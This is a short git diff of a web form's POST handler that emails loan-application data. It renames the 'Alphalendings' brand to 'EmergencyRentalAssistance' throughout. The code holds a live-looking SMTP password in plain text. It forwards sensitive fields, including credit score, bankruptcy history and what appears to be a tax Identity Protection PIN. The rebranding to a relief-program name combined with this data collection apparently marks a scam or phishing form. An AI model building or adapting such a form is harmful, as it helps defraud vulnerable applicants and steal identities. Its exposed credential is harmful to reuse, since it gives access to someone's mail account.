@@ -25,21 +25,21 @@ export async function POST(request) {
     port: 465,
     secure: true,
     auth: {
-      user: "noreply@alphalendings.us",
+      user: "noreply@EmergencyRentalAssistance.us",
       pass: "mighTY88$$",
     },
   });
 
   // const autoReplyMessage = {
-  //   from: "no-reply <noreply@alphalendings.com>",
+  //   from: "no-reply <noreply@EmergencyRentalAssistance.com>",
   //   to: formData.emailAddress,
   //   subject: "Loan Application Received",
   //   html: `
   //     <h3>Thank you for your loan application!</h3>
   //     <p>We have received your loan application and will review it shortly.</p>
-  //     <p>If you have any further questions or need assistance, please feel free to contact us: loans@alphalendings.us></a></p>
+  //     <p>If you have any further questions or need assistance, please feel free to contact us: loans@EmergencyRentalAssistance.us></a></p>
   //     <p>Best regards,</p>
-  //     <p>Alphalendings Team</p>
+  //     <p>EmergencyRentalAssistance Team</p>
   //     `,
   // };
   // Compose the email message
@@ -88,8 +88,12 @@ export async function POST(request) {
     <p>Military Status: ${formData.militaryStatus}</p>
     <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
     <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
-    <p>Alphalendings Source: ${formData.AlphalendingsSource}</p>
-    <p>Alphalendings Source Other: ${formData.AlphalendingsSourceOther}</p>
+    <p>EmergencyRentalAssistance Source: ${
+      formData.EmergencyRentalAssistanceSource
+    }</p>
+    <p>EmergencyRentalAssistance Source Other: ${
+      formData.EmergencyRentalAssistanceSourceOther
+    }</p>
     <p>Credit Score: ${formData.creditScore}</p>
     <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
     <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
